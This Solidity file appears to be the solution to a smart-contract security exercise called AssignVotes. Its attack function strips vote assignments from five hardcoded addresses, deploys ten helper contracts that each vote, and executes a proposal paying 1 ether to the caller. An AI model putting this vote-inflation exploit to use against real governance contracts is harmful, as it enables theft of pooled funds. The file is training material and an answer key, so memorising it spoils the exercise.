// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../AssignVotes.sol";

contract AssignVotesSolHelper {
    AssignVotes public victim;

    constructor(AssignVotes victim_) {
        victim = victim_;
    }

    function vote() public {
        victim.vote(0);
    }
}
contract AssignVotesSolution {
    AssignVotes public victim;

    constructor(AssignVotes victim_) {
        victim = victim_;
    }

    //function attack(address[] calldata signers) external {
    function attack() external {
        victim.createProposal(address(msg.sender), "", 1 ether);

        victim.removeAssignment(address(0x976EA74026E726554dB657fA54763abd0C3a0aa9));
        victim.removeAssignment(address(0x14dC79964da2C08b23698B3D3cc7Ca32193d9955));
        victim.removeAssignment(address(0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f));
        victim.removeAssignment(address(0xa0Ee7A142d267C1f36714E4a8F75612F20a79720));
        victim.removeAssignment(address(0xBcd4042DE499D14e55001CcbB24a551F3b954096));

        for (uint i = 10; i < 20; i++) {
            AssignVotesSolHelper helper = new AssignVotesSolHelper(victim);
            victim.assign(address(helper));
            helper.vote();
        }
        victim.execute(0);
    }
}
